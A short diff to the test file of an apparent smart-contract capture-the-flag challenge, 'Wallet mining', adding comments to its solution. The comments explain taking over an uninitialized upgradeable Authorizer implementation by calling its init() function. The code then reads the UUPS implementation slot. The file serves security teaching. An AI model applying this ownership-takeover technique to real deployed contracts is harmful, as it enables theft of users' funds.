@@ -113,6 +113,8 @@ describe('[Challenge] Wallet mining', function () {
         ]);
         await proxyFactory.createProxy(mockWallet.address, payload);
 
+        // We can to upgrade the `AuthorizerUpgradeable` to bypass the `can()` check. This is because the contract does not run `_disableInitializers()`
+        // in its constructor, so we can directly take control of its ownership by calling its `init()` function.
         // UUPSUpgradable Implementation Slot: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
         const implementationSlot = await ethers.provider.getStorageAt(authorizer.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
         const implementationAddr = `0x` + implementationSlot.slice(-40);
